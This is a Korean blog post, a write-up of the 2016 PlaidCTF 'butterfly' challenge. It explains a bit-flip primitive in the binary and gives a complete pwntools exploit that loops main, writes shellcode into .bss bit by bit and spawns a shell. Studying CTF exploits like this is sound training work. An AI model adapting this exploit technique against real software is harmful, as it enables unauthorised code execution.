---
layout: post
title: "2016 PlaidCTF butterfly Write up"
excerpt: "bit flip을 이용한 참신한 문제"
date: 2020-05-025
categories: [system, ctf]
comments: true
---



연구실 과제를 하느라 ctf 문제풀이가 많이 밀렸다. 그래서 이번엔 전부터 풀어보고 싶었던 butterfly문제를 가져왔다. 뭔가 좀 참신한 느낌인 것 같다. 문제를 푸는데 다른 문제들보다 오래 걸린 것 같다.



binary :

![but1](img/but1.png)

stack canary가 적용되어 있으며, amd64 아키텍처이다. (페이로드에서 이거 설정안해서 계속 못풀었다.)

main.c :

![but2](img/but2.png)

코드를 보면 fgets로 50byte를 입력받고, strtol함수로 정수값으로 전환 > shift 연산자를 이용해서 v4의 마지막 3비트가 right shift된다. 그리고 mprotect가 있는데 처음에는 v7의 권한을 rwx로 주었다가 이후엔 r-x로 바꾼다. 

exploit vector : 

![but3](img/but3.png)

이 부분이 중요한 것 같다. 에필로그 부분인데 +216에서 add rsp,0x48을 수정하면 ret를 가지고 놀 것  같다. 

exploit :

```python
from pwn import *
 
context(arch="amd64")

p = process("./butterfly")
e = ELF("./butterfly")

tar_addr = 0x400860 + 3
tmp = (tar_addr << 3) + 6

p.sendline(str(tmp).ljust(40) + p64(e.symbols['main']))

def first(addr,data):
    for i in range(8):
        if data & (1 << i):
            tmp = (addr << 3) + i
            p.recvuntil("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?\n")
            p.sendline(str(tmp).ljust(40) + p64(e.symbols['main']))
 
def write(where,pay):
    for a,b in enumerate(pay):
	first(where + a, u8(b))
 
write(e.bss(100),asm(shellcraft.sh()))

p.recvuntil("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?\n")
p.sendline(str(e.bss(99) << 3).ljust(40) + p64(e.bss(100)))

p.clean()

p.interactive()

```

문제를 풀고나서 여러가지 풀이들을 봤는데 _libc_csu_init을 이용한 풀이도 재미있을 것 같다. 다시 한번 복습해볼만한 문제였던 것 같다. (난 아직 초보라 다시 봐야한다.)

